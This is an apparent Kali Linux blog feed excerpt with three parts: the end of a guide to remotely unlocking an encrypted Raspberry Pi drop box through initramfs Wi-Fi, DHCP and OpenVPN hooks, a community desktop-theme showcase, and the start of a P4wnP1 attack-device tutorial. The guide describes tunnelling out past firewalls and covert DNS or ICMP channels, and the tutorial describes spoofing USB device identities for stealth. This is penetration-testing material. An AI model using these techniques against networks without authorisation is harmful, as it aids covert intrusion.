already got busybox which has a DHCP server applet enabled in the initramfs, we will just use that instead. We do not need a fully featured DHCP server just to unlock our Raspberry Pi and let it finish booting.</p> <p>First we set up the configuration file for it <code>/etc/udhcpd.conf</code> with the following information:</p> <pre><code class="language-plaintext">start 192.168.42.2 # IP address range to give out end 192.168.42.100 # Last IP address to give out interface wlan0 # Device that the DHCP server listens on remaining yes # opt router 192.168.42.1 # The Raspberry Pi's IP address to use on wlan0 opt subnet 255.255.255.0 # opt dns 8.8.8.8 4.2.2.2 # DNS servers to pass (not really required for our needs) opt lease 600 # 10 minute DHCP lease </code></pre> <hr> <p>And we create our hook which copies in our DHCP config, <code>/etc/initramfs-tools/hooks/udhcpd</code>:</p> <pre><code class="language-bash">#!/bin/sh set -e PREREQ=&quot;&quot; prereqs() { echo &quot;${PREREQ}&quot; } case &quot;${1}&quot; in prereqs) prereqs exit 0 ;; esac . /usr/share/initramfs-tools/hook-functions # Copy our hostapd.conf file copy_file config /etc/udhcpd.conf /etc/udhcpd.conf </code></pre> <hr> <p>Like our previous hooks and scripts, we need to make sure the executable flag is set:</p> <pre><code class="language-console">kali@kalipi:~$ sudo chmod +x /etc/initramfs-tools/hooks/hostapd kali@kalipi:~$ sudo chmod +x /etc/initramfs-tools/hooks/udhcpd kali@kalipi:~$ sudo chmod +x /etc/initramfs-tools/scripts/init-premount/hostapd </code></pre> <hr> <p>And now that everything is in place for hostapd support, we need to build the initramfs so that it has our changes in there:</p> <pre><code class="language-console">kali@kalipi:~$ mkinitramfs -o /boot/initramfs.gz 5.15.44-Re4son-v8l+ kali@kalipi:~$ kali@kalipi:~$ lsinitramfs /boot/initramfs.gz | grep -e hostapd -e udhcpd etc/hostapd etc/udhcpd.conf scripts/init-premount/hostapd usr/sbin/hostapd usr/sbin/udhcpd </code></pre> <p>Once we see all the parts are there, we are able to reboot the Raspberry Pi and we should see our Wi-Fi network from another machine.</p> <p><p> <a href='https://www.kali.org/blog/remotely-accessing-secure-kali-raspberry-pi/images/secure-kalipi-wifi.png'> <img src="https://www.kali.org/blog/remotely-accessing-secure-kali-raspberry-pi/images/secure-kalipi-wifi.png" alt="" /> </a> </p> </p> <p>Connect to it, and we should be able to unlock the device via SSH!</p> <hr> <h2 id="wired-connection">Wired Connection</h2> <p>By default, the wired connection on a Raspberry Pi will attempt to use DHCP to connect to a network when it is plugged in. You may want to set a static IP, we need to do similar to <a href="https://www.kali.org/blog/remotely-accessing-secure-kali-raspberry-pi/#wi-fi---static-ip">above</a>, and set the IP manually in the <code>/boot/cmdline.txt</code> file, which is what the Raspberry Pi uses for the kernel command line arguments.</p> <h3 id="static-ip-1">Static IP</h3> <p>The default <code>/boot/cmdline.txt</code> is set to:</p> <pre><code class="language-shell">kali@kalipi:~$ cat /boot/cmdline.txt console=serial0,115200 console=tty1 root=PARTUUID=da77a68a-02 rootfstype=ext4 fsck.repair=yes rootwait net.ifnames=0 </code></pre> <p>The format of <code>/boot/cmdline.txt</code> should look similar to:</p> <pre><code class="language-plaintext">ip=&lt;client-ip&gt;:&lt;server-ip&gt;:&lt;gw-ip&gt;:&lt;netmask&gt;:&lt;hostname&gt;:&lt;device&gt;:&lt;autoconf&gt;:&lt;dns0-ip&gt;:&lt;dns1-ip&gt;:&lt;ntp0-ip&gt; </code></pre> <p><code>/boot/cmdline.txt</code> requires everything to be on one line, so if we want to set our IP address to <code>192.168.42.3</code>, with a gateway of <code>192.168.42.1</code>, our hostname to <code>securekalipi</code>, for the <code>eth0</code> device, our <code>/boot/cmdline.txt</code> file will look like:</p> <pre><code class="language-plaintext">console=serial0,115200 console=tty1 root=PARTUUID=da77a68a-02 rootfstype=ext4 fsck.repair=yes rootwait net.ifnames=0 ip=192.168.42.3::192.168.42.1:255.255.255.0:securekalipi:eth0 </code></pre> <p>As the <a href="https://docs.kernel.org/admin-guide/nfs/nfsroot.html">documentation</a> states, anything that is not specified uses the default settings, so we simply skip putting anything in between the <code>:</code> that we want to skip. And we tell it to use the <code>eth0</code> device, as that is the default device name for ethernet on the Raspberry Pi.</p> <hr> <h2 id="vpn-tunnel">VPN Tunnel</h2> <div class="notices info"> <p data-header="Info"> Before we go over connecting to a VPN, it is important to note that the information will be stored in the initramfs file, <strong>unencrypted</strong>. This particular use case is <strong>NOT</strong> about securing the connection, but instead using the VPN to tunnel out of the network to bypass various firewall rules. As such, this connection should be treated as if the traffic is clear text. </p> </div> <p>After we have got our device connected to the network, great! We are now wanting to remotely connect to it. Due to firewalls on the network, being able to directly SSH into the device will be next to impossible (as we cannot do port forwarding). So we are needing the device to connect back to us (bind vs reverse)! You may opt for a SSH reverse connection, where the device continuously polls back home, however, we have opted to use a VPN. You may wish to use OpenVPN, WireGuard, or something else. We have opted for OpenVPN, however we are not going to cover how to set up and secure an OpenVPN server.</p> <p>Regardless of the reverse service used, network traffic may be filtered by firewall rules which may limit what services can be used. For example SSH (22/TCP) or OpenVPN (1194/UDP) default ports may not be allowed out. As a result, think of what typical end-users may often use the network for. Commonly you see a lot of web traffic, so HTTPS (<code>443/TCP</code>) should hopefully give a higher chance of success, such as HTTPS (<code>443/TCP</code>)! <em>We will talk about this again at the end of the blog post.</em></p> <p>If you have created a new private network by starting an <a href="https://www.kali.org/blog/remotely-accessing-secure-kali-raspberry-pi/#wifi---access-point">access point</a>, there is not going to be an upstream gateway configured. As a result, the VPN tunnel will not be able to connect to the internet. You will need to find another way to get online, by either using another mode (<a href="https://www.kali.org/blog/remotely-accessing-secure-kali-raspberry-pi/#wi-fi---client-mode">Wi-Fi client</a>), or another interface (wired ethernet, mobile hotspot etc).</p> <hr> <p>As always, to use OpenVPN before the system is booted we need our hook to copy the OpenVPN software and our client configuration in to our initramfs.</p> <p>First up is the hook. This copies the software, its dependencies, and our configuration file into the initramfs. We gathered this information the same way we did with <code>hostapd</code> above, so we will not go over that again.</p> <p>The OpenVPN hook, <code>/etc/initramfs-tools/hooks/openvpn</code>:</p> <pre><code class="language-bash">#!/bin/sh set -e PREREQ=&quot;&quot; prereqs() { echo &quot;$PREREQ&quot; } case &quot;$1&quot; in prereqs) prereqs exit 0 ;; esac . /usr/share/initramfs-tools/hook-functions [ -r /etc/crypttab ] || exit 0 copy_exec /usr/sbin/openvpn /sbin copy_exec &quot;/lib/aarch64-linux-gnu/libzstd.so.1&quot; copy_exec &quot;/lib/aarch64-linux-gnu/libnsl.so.1&quot; copy_exec &quot;/lib/aarch64-linux-gnu/liblzo2.so.2&quot; copy_exec &quot;/lib/aarch64-linux-gnu/libresolv.so.2&quot; copy_exec &quot;/lib/aarch64-linux-gnu/libpkcs11-helper.so.1&quot; copy_exec &quot;/lib/aarch64-linux-gnu/libm.so.6&quot; # Copy in our configuration file and username/password files cp -p /etc/initramfs-tools/openvpn/client/* ${DESTDIR}/etc/openvpn/client/ </code></pre> <hr> <p>And then we have to add our OpenVPN script to run in the initramfs, that uses our configuration file to connect to our OpenVPN server. Because this is running before there is any way to interact with the system, we also need to be able to pass the username and password somehow. A quick check of the <a href="https://manpages.debian.org/testing/openvpn/openvpn.8.en.html">openvpn man page</a> shows us:</p> <blockquote> <p><code>--auth-user-pass</code></p> <p>Authenticate with server using username/password.</p> <p>Valid syntaxes:</p> <p><code>auth-user-pass</code></p> <p><code>auth-user-pass up</code></p> <p>If up is present, it must be a file containing username/password on 2 lines. If the password line is missing, OpenVPN will prompt for &gt; one.</p> <p>If up is omitted, username/password will be prompted from the console.</p> </blockquote> <p>The option we want is <code>--auth-user-pass up</code>. So we will create a file called <code>up</code> with our username (<code>dropboxuser</code>) on the first line, and password (<code>pass123</code>) on the second line:</p> <pre><code class="language-console">kali@kalipi:~$ echo dropboxuser | sudo tee /etc/openvpn/client/up [...] kali@kalipi:~$ echo pass123 | sudo tee -a /etc/openvpn/client/up </code></pre> <p>If your VPN connection does not require a username/password, you can remove the <code>--auth-user-pass /etc/openvpn/up</code> in the <code>vpnflags</code> variable below.</p> <hr> <p>The script, which starts OpenVPN, <code>/etc/initramfs-tools/scripts/init-premount/openvpn</code>:</p> <pre><code class="language-bash">#!/bin/sh set -e PREREQ=&quot;udev networking&quot; prereqs() { echo &quot;$PREREQ&quot; } case &quot;$1&quot; in prereqs) prereqs exit 0 ;; esac [ -x /sbin/openvpn ] || exit 0 run_openvpn() { local vpnflags=&quot;--suppress-timestamps --nobind --config /etc/openvpn/client/openvpn.conf --auth-user-pass /etc/openvpn/client/up&quot; log_begin_msg &quot;Starting OpenVPN&quot; exec /sbin/openvpn $vpnflags ifconfig -a } . /scripts/functions sleep 40 run_openvpn &amp; echo $! &gt;/run/openvpn.pid </code></pre> <hr> <p>And like with the others, we make sure our hooks and scripts are executable:</p> <pre><code class="language-console">kali@kalipi:~$ sudo chmod +x /etc/initramfs-tools/hooks/openvpn kali@kalipi:~$ sudo chmod +x /etc/initramfs-tools/scripts/init-premount/openvpn </code></pre> <hr> <p>And now that everything is in place for connecting to OpenVPN, we need to build the initramfs so that it has our changes in there:</p> <pre><code class="language-console">kali@kalipi:~$ mkinitramfs -o /boot/initramfs.gz 5.15.44-Re4son-v8l+ kali@kalipi:~$ kali@kalipi:~$ lsinitramfs /boot/initramfs.gz | grep -e openvpn etc/openvpn etc/openvpn/client etc/openvpn/client/up scripts/init-premount/openvpn usr/sbin/openvpn </code></pre> <hr> <p>Now that the initramfs is updated, and we see that our changes are in there, we are able to reboot the Raspberry Pi. Once it starts booting, and once the network connection is available, it should connect to our OpenVPN server.</p> <p>You will want to test this in your home lab, before you deploy it anywhere, to make sure it&rsquo;s working:</p> <pre><code class="language-console">kali@kali:~$ ssh kali@172.16.20.2 The authenticity of host '172.16.20.2' can't be established. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '172.16.20.2' (ECDSA) to the list of known hosts. kali@172.16.20.2's password: Linux kali-raspberry-pi 5.15.44-Re4son-v8+ #1 SMP PREEMPT Debian kali-pi (2022-07-03) aarch64 The programs included with the Kali GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. +--(kali?kali-raspberry-pi)-[~] +-$ </code></pre> <hr> <h2 id="summary">Summary</h2> <p>In this blog post, we have covered gathering information about our device, in this case it was a Raspberry Pi, but the information gathering holds true for any device running Kali that you might want to unlock remotely.</p> <p>We also covered setting a static IP for both wired and Wi-Fi networks, setting up an access point, and using an OpenVPN connection, these are not specific to the Raspberry Pi, aside from the firmware and module for the Wi-Fi device.</p> <p>We hope you found this blog post helpful, and if you have any questions or comments, please check out the <a href="https://discord.kali.org/">Kali Discord</a> server.</p> <h3 id="food-for-thought">Food for Thought</h3> <p>To expand on this future, some improvements which we came up with:</p> <ul> <li>Rather than tunneling over OpenVPN, use other tools (such as <a href="https://www.kali.org/tools/dnscat2/">dnscat2</a>), ICMP (such as <a href="https://www.kali.org/tools/ptunnel/">ptunnel</a>) or a mixture of all three!</li> <li>Encapsulate the OpenVPN traffic (such as <a href="https://www.kali.org/tools/stunnel4/">stunnel</a>), making it legit HTTPS data, rather than only using default port</li> <li>Using WireGuard rather than OpenVPN</li> <li>Mobile connectivity (using an external 3G/4G/LTE adapter)</li> <li>Adding fall back method(s) - If Wi-Fi client is not working, create then a Wi-Fi access point</li> <li>&ldquo;WLAN Knocking&rdquo; - The Raspberry Pi is monitoring for a certain SSID being broadcasted <em>(maybe from a certain MAC address)</em>, when detected, only then perform an action</li> </ul> <p>We are sure you can also think outside of the box, and come up with additional ideas too. Please <a href="https://twitter.com/kalilinux">tweet</a> us your ideas, and progress with your drop box!</p> <hr> <h2 id="additional-resources">Additional Resources</h2> <p><strong>Wi-Fi in initramfs</strong>:</p> <ul> <li><a href="https://github.com/unixabg/cryptmypi/blob/master/hooks/0000-experimental-initramfs-wifi.hook">Cryptmypi Experimental WiFi initramfs hook</a></li> <li><a href="https://www.marcfargas.com/posts/enable-wireless-debian-initramfs">Enable Wireless networks in Debian Initramfs</a></li> <li><a href="http://retinal.dehy.de/docs/doku.php?id=technotes:raspberryrootnfs">Raspberry Pi Zero W with the root FS mounted over NFS</a></li> <li><a href="https://wiki.archlinux.org/title/Dm-crypt/Specialties#Remote_unlock_via_WiFi">Remote Unlock via WiFi</a></li> </ul> <p><strong>Setting up hostapd</strong>:</p> <ul> <li><a href="https://raspberrypi.com/documentation/computers/configuration.html#setting-up-a-bridged-wireless-access-point">Raspberry Pi Documentation</a></li> <li><a href="https://0x72326432.com/posts/perstapsk_en/">Per station WPA2 PSK with hostapd</a></li> </ul></description>
</item>
<item>
<title>Kali Community Themes</title>
<link>https://www.kali.org/blog/kali-community-themes/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-community-themes/</guid>
<pubDate>Mon, 24 Oct 2022 00:00:00 +0000</pubDate>
<enclosure url="https://www.kali.org/blog/kali-community-themes/images/kali-community-themes-banner.jpg" type="image/jpg"/>
<description> <div class="notices info"> <p data-header="Info"> The following blog post was written by a moderator on the <a href="https://discord.kali.org/">Kali Linux &amp; Friends</a> Discord server, Tristram. A massive thank you to Tristram for writing this blog post and to all of the participants! </p> </div> <p>This past summer we held our first community event on the <a href="https://discord.kali.org/">Kali Linux &amp; Friends</a> Discord. With this event, we asked everyone who wanted to participate to share their Kali Linux setup. With each submission, the community had to select their favorite by adding the <code>:kali4kids:</code> emoji (Shown below). The five submissions with the most <code>:kali4kids:</code> emojis were deemed the winner.</p> <p><p> <a href='https://www.kali.org/blog/kali-community-themes/images/kali4kids.png'> <img src="https://www.kali.org/blog/kali-community-themes/images/kali4kids.png" alt="" /> </a> </p> </p> <p>The community has spoken and we are happy to showcase the following setups. The author of each setup has provided us with a little blurb to get to know them a little more, as well as their setup.</p> <h2 id="zephyfoxy5208">ZephyFoxy#5208</h2> <p>I am a senior security consultant working for a large, multinational consulting firm. I conduct pentests in a variety of different fields, and have been working in Android malware analysis for the last year. I hold the OSCP and OSEP certifications, and I will be working towards OSED and OSWE in the near future. I chose this setup for my Kali Linux because I personally prefer a colourful environment that really stands out.</p> <p>The customization to the terminal comes from the need to reference my IP address for things such as reverse shells or file transfers. You can find a copy of my <code>~/.zshrc</code> on my <a href="https://github.com/purpl3f0xsecur1ty/useful_random_stuff/blob/main/.zshrc">GitHub</a>.</p> <p><p> <a href='https://www.kali.org/blog/kali-community-themes/images/ZephyFoxy.png'> <img src="https://www.kali.org/blog/kali-community-themes/images/ZephyFoxy.png" alt="" /> </a> </p> </p> <hr> <h2 id="tachyglossues2480">tachyglossues#2480</h2> <p>I&rsquo;m a French student who likes to tinker and understand how computers work especially on the software side and I&rsquo;ve been using Kali for about a year and a half.</p> <p>The program I wrote works by running <code>top</code> to get the list of software running on the session with the RAM and CPU they use and after that a python dependency that is used to generate word clouds is used with a mask of the kali4kids logo to give the shape and colour and this mask is a simple .png file. I made this program because I like to have a wallpaper that I made and also I like minimalist wallpapers and it can be useful. You can find a copy on my <a href="https://github.com/tachyglossues/wallpaper-process-wordcloud">GitHub</a>.</p> <p><p> <a href='https://www.kali.org/blog/kali-community-themes/images/tachyglossues.png'> <img src="https://www.kali.org/blog/kali-community-themes/images/tachyglossues.png" alt="" /> </a> </p> </p> <h2 id="fumenoid9548">fumenoid#9548</h2> <p>Hi, I am fume. I have recently graduated from uni and I am working as a penetration tester. Aside from my job, I also like to develop challenges for CTF events. My time sinks are anime, manga, and at times I also play CS:GO.</p> <ul> <li><a href="https://github.com/xct/kali-clean">XCT i3 kali setup script</a> I love Kali Linux, it has always been one of my favourite penetration testing distros. My Kali setup is highly inspired from <a href="https://github.com/xct/kali-clean">xct&rsquo;s Kali setup</a>, so I use <a href="https://pkg.kali.org/pkg/i3-gaps">kali-i3 gaps</a> as my desktop environment with <a href="https://pkg.kali.org/pkg/rust-alacritty-terminal">alacritty</a> as my terminal emulator. I use Zsh and have customized it with oh-my-zsh (theme: <code>agnoster</code>). I have done further additions to the i3 bar and have added custom shortcuts in configs to organize my workflow. I am also using <a href="https://pkg.kali.org/pkg/ranger">ranger</a> as my command line file manager and <a href="https://pkg.kali.org/pkg/btop">btop</a> for rice. A pretty slick thing about ranger is that it also has the same shortcuts as <a href="https://pkg.kali.org/pkg/vim">vim</a>. And yes I believe in vim supremacy :P. Also, I am using megumi&rsquo;s picture as my wallpaper, the best girl right?</li> </ul> <p>I don&rsquo;t have scripts or dot-files publicly available for my setup but here are some resources that might help y&rsquo;all to build a similar/better setup.</p> <ul> <li><a href="https://github.com/xct/kali-clean">XCT i3 kali setup script</a> <ul> <li>I would recommend reading the script and using it as a base but please don&rsquo;t blindly execute it if you aren&rsquo;t aware of what you are doing.</li> </ul> </li> <li><a href="https://www.youtube.com/watch?v=8-S0cWnLBKg">Alex Booker YouTube videos on i3wm:</a></li> <li><a href="https://www.youtube.com/watch?v=L6Vu7WPkoJo">Luke Smith&rsquo;s YouTube videos on Ranger and Vim</a></li> </ul> <p>Feel free to reach out to me on the Kali Linux discord if you have further questions :D</p> <p><p> <a href='https://www.kali.org/blog/kali-community-themes/images/fumenoid.png'> <img src="https://www.kali.org/blog/kali-community-themes/images/fumenoid.png" alt="" /> </a> </p> </p> <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;"> <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="allowfullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.kali.org/blog/kali-community-themes/https://www.youtube-nocookie.com/embed/8-S0cWnLBKg?autoplay=0&controls=1&end=0&loop=0&mute=0&start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video" ></iframe> </div> <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;"> <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="allowfullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.kali.org/blog/kali-community-themes/https://www.youtube-nocookie.com/embed/L6Vu7WPkoJo?autoplay=0&controls=1&end=0&loop=0&mute=0&start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video" ></iframe> </div> <hr> <h2 id="leo-tornado4019">leo-tornado#4019</h2> <p>My name is Ahmed and I am 17 years old. I study mathematics and have a passion for cyber security. I am interested in making my own desktop as it encourages me to keep working. I can&rsquo;t explain it but when you open the computer and find something you made, it inspires you to keep learning more. I don&rsquo;t have links to share, but anyone can do this so you just have to be a little creative. It was a good competition, thank you for organizing.</p> <p><p> <a href='https://www.kali.org/blog/kali-community-themes/images/leo-tornado.png'> <img src="https://www.kali.org/blog/kali-community-themes/images/leo-tornado.png" alt="" /> </a> </p> </p> <hr> <h2 id="_henry_3058">_Henry_#3058</h2> <p>Hey guys, I&rsquo;m Henry. I&rsquo;m currently a &ldquo;Cybersecurity Engineer&rdquo; by day, and a bad PEN-300 student by night (I really need to get those labs done). You might have interacted with me in a Discord livestream, or maybe peeped one of my (admittedly few) walk-through videos on my <a href="https://www.youtube.com/channel/UCIFrSJrAxgC86z19u6W1H8Q">YouTube channel</a>. While I am not the greatest among us, I take enjoyment in helping others fulfil their potential and achieve their goals, pentesting or otherwise.</p> <p>Regarding my build, while I half entered the competition as a joke, I unironically REALLY like the default Kali terminal. The only modification I&rsquo;ve made is I&rsquo;ve changed the key bindings of moving between split terminals from &ldquo;<strong>Alt + Arrow Key</strong>&rdquo; to &ldquo;<strong>Shift + Arrow Key</strong>&rdquo; because the <code>alt</code> movement would break on me from time to time. Outside of just enjoying the default terminal, font, and syntax highlighting, I am used to the default theme, so whether I am on an assessment with a fresh Kali install, looking at a friend&rsquo;s screen, or helping someone troubleshoot their machine, the terminal looking back at me is almost always a familiar (and pretty) face.</p> <p><p> <a href='https://www.kali.org/blog/kali-community-themes/images/Henry.png'> <img src="https://www.kali.org/blog/kali-community-themes/images/Henry.png" alt="" /> </a> </p> </p> <hr> <h2 id="wrapping-up">Wrapping Up</h2> <p>We hope that these submissions inspire you to help bring a piece of yourself to your Kali Linux system. Come join us over at <a href="https://discord.kali.org/">Kali Linux &amp; Friends</a> and be a part of our growing community to grow and learn from one another.</p></description>
</item>
<item>
<title>Community Showcase: Raspberry Pi Zero W P4wnP1 A.L.O.A.</title>
<link>https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/</link>
<guid isPermaLink="true">https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/</guid>
<pubDate>Thu, 13 Oct 2022 00:00:00 +0000</pubDate>
<enclosure url="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/kali-p4wnp1-banner.jpg" type="image/jpg"/>
<description><p>The Kali community has been hard at work (as always!), and we want to showcase what we think is a very cool project of Kali Linux on a <a href="https://www.kali.org/docs/arm/raspberry-pi-zero-w/">Raspberry Pi Zero W</a>, the &ldquo;<strong><a href="https://www.kali.org/docs/arm/raspberry-pi-zero-w-p4wnp1-aloa/">P4wnP1 A.L.O.A.</a></strong> (<strong>A</strong> <strong>L</strong>ittle <strong>O</strong>ffensive <strong>A</strong>pplication)&rdquo;.</p> <p>It takes the standard Kali Linux image and adds custom software and some extra firmware designed for the Raspberry Pi Zero W to turn it into a <strong>Swiss Army knife of attacks and exfiltration</strong>.</p> <p>This blog post will be a <a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#using-the-p4wnp1-aloa">brief overview</a> of how to get started using the web interface, <a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#creating-our-own-trigger">setting up a trigger</a> as well as <a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#installing-a-package-when-connected-in-client-mode">installing additional packages</a> found in Kali Linux. There is a lot more to P4wnP1 than this blog post goes over, which is why we have included <a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#other-resources">additional reading material</a> from the community which cover additional attack scenarios as well as more payloads that people have written if you want to go deeper!</p> <p>If you have a Raspberry Pi Zero W, we highly recommend giving this image a try. We see this as a great tool in any tester&rsquo;s toolkit!</p> <h2 id="shopping-list">Shopping List</h2> <ul> <li><a href="https://www.kali.org/docs/arm/raspberry-pi-zero-w/">Raspberry Pi Zero W</a> <em>(<strong>not</strong> Zero 2 W)</em></li> <li>Raspberry Pi Zero W <a href="https://www.makerfocus.com/products/usb-type-a-adapter-board-for-raspberry-pi-zero-w">USB-A Add-on Board</a> (optional but recommended)</li> <li>MicroUSB to USB-A cable (required if you are not using the above add-on board)</li> <li>MicroSD card (32GB or larger)</li> <li><a href="https://www.kali.org/get-kali/">Kali Linux Raspberry Pi Zero W P4wnP1 A.L.O.A.</a> image</li> </ul> <h2 id="setting-up-to-get-down-to-business">Setting Up To Get Down To Business</h2> <p>First thing, download the <a href="https://www.kali.org/get-kali/#kali-arm">Kali P4wnP1 A.L.O.A. image</a>. <em>At the time of writing, the current version is 2022.3:</em></p> <pre><code class="language-console">kali@kali:~/Downloads$ ls kali-linux-2022.3-raspberry-pi-zero-w-p4wnp1-aloa-armel.img.xz </code></pre> <hr> <p>We will verify the download as well, by going back to the download page and clicking on the <code>sum</code> link on the <strong>Raspberry Pi Zero W (P4wnP1 A.L.O.A)</strong> line to get the SHA256 checksum:</p> <pre><code class="language-console">kali@kali:~/Downloads$ echo &quot;210635bb3dc7876b638a7035cd4dc60e0b134b19a6aec42a75f5995036b45840 kali-linux-2022.3-raspberry-pi-zero-w-p4wnp1-aloa-armel.img.xz&quot; | sha256sum -c kali-linux-2022.3-raspberry-pi-zero-w-p4wnp1-aloa-armel.img.xz: OK </code></pre> <hr> <p>Now that we have verified that we have downloaded the file and it matches, we write it to the microSD card, which on <strong>our system</strong> is <code>/dev/sdb</code> - on <strong>your system this may be different</strong>, <strong>do NOT just copy and paste</strong> what we have put here, because you <strong>WILL</strong> overwrite whatever you have on your system&rsquo;s <code>/dev/sdb</code> if you do.</p> <p>The <code>xzcat</code> command will open the compressed image file and pipe it to the <code>dd</code> command, which will do the actual writing to the microSD card. The use of <code>xzcat</code> is a quick trick, as it removes having to actually uncompress the image first:</p> <pre><code class="language-console">kali@kali:~/Downloads$ xzcat kali-linux-2022.3-raspberry-pi-zero-w-p4wnp1-aloa-armel.img.xz | sudo dd of=/dev/sdb bs=1M status=progress [sudo] password for kali: 6421807104 bytes (6.4 GB, 6.0 GiB) copied, 101 s, 63.6 MB/s 0+577993 records in 0+577993 records out 6442450944 bytes (6.4 GB, 6.0 GiB) copied, 162.961 s, 39.5 MB/s </code></pre> <div class="notices info"> <p data-header="Info"> The speeds above are on our system, these will differ based on your system and the speed of the microSD card that you are using. </p> </div> <hr> <p>Now that this is done, we can unplug the microSD card from the machine, and plug it in to our Raspberry Pi Zero W. If you are using a USB-A adapter similar to what we linked to in the &ldquo;<a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#shopping-list">shopping list</a>&rdquo; section, you can plug it in to your computer to power it on, otherwise power the Raspberry Pi Zero W via the micro port as usual.</p> <p>Since the first boot of Kali Linux will do things like resize the filesystem, and set up the <a href="https://www.kali.org/docs/introduction/default-credentials/">default credentials</a> (user: <code>kali</code>, password: <code>kali</code>) the timing will vary based on microSD card speed.</p> <h2 id="using-the-p4wnp1-aloa">Using the P4wnP1 A.L.O.A.</h2> <p>Once it is booted, you will know everything is <strong>ready to go, when you see the default wireless network</strong>: <code>?????? ???????</code>. <em>Handy if you do not have an HDMI monitor plugged in!</em></p> <p>Select the above SSID, and then we login with the <strong>password</strong>: <code>MaMe82-P4wnP1</code>.</p> <p><p> <a href='https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/select-network-1.png'> <img src="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/select-network-1.png" alt="" /> </a> </p> </p> <hr> <p>Now that we are connected, we should see our wireless device is connected and has an IP address in the <code>172.24.0.xxx/24</code> range:</p> <pre><code class="language-console">kali@kali:~$ ip a 1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: wlan0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 4096 link/ether 00:03:7f:12:1f:ae brd ff:ff:ff:ff:ff:ff inet 172.24.0.12/24 brd 172.24.0.255 scope global dynamic noprefixroute wlan0 valid_lft 297sec preferred_lft 297sec </code></pre> <p>We can see that the IP address of our <code>wlan0</code> adapter is <code>172.24.0.12</code>, so <strong>we are connected</strong>! Since we are successfully connected, lets pull up the web interface in our browser.</p> <p>The <strong>default IP</strong> address of the P4wnP1 A.L.O.A image is <code>172.24.0.1</code> and the service listens on port <code>8000</code> so we go to <a href="http://172.24.0.1:8000/">http://172.24.0.1:8000/</a> in our browser.</p> <hr> <p>Upon login we can see the list at the top: <strong><a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#usb-settings">USB Settings</a></strong>, <strong><a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#Wi-Fi-settings">Wi-Fi Settings</a></strong>, <strong><a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#bluetooth">Bluetooth</a></strong>, <strong><a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#network-settings">Network Settings</a></strong>, <strong><a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#trigger-actions">Trigger Actions</a></strong>, <strong><a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#hidscript">HIDScript</a></strong>, <strong><a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#event-log">Event Log</a></strong> and <strong><a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/#generic-settings">Generic Settings</a></strong>.</p> <p><p> <a href='https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-default.png'> <img src="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/images/p4wnp1-default.png" alt="" /> </a> </p> </p> <p>One quick thing to note as we are going through the interface below. Under the navigation menu, each section has various buttons, depending on what screen is currently being shown. A legend for what these buttons mean:</p> <table> <thead> <tr> <th>Name</th> <th>What it does</th> </tr> </thead> <tbody> <tr> <td>Deploy</td> <td>Activate</td> </tr> <tr> <td>Deploy Stored</td> <td>Load something that is saved, and activate it</td> </tr> <tr> <td>Reset</td> <td>Return to default settings</td> </tr> <tr> <td>Store</td> <td>Save</td> </tr> <tr> <td>Load Stored</td> <td>Load something that has been saved</td> </tr> <tr> <td>Run</td> <td>Run the current HID Script</td> </tr> <tr> <td>Load &amp; Replace</td> <td>Load a saved HID Script and Replace the current contents with it</td> </tr> <tr> <td>Load &amp; Prepend</td> <td>Load a saved HID Script, and add it to the beginning of the current script</td> </tr> </tbody> </table> <h4 id="usb-settings">USB Settings</h4> <p>Here we can <strong>change the Vendor ID (VID)</strong> &amp; <strong>Product ID (PID) of the device</strong>, so if you want to pretend to be a specific storage device, you can! You can also alter <strong>Manufacturer Name</strong> &amp; <strong>Product Name</strong>, as well as the <strong>serial number</strong> if you really want to clone a certain device. <em>Great if you are trying to be stealthy and have done your homework by scoping out the environment.</em></p> <p>You can also change various other settings to alter the behavior of how the USB device acts (allowing for keyboard, mouse, network support, mass storage, and even serial)!</p> <p><em>A nice resource to point out here is <a 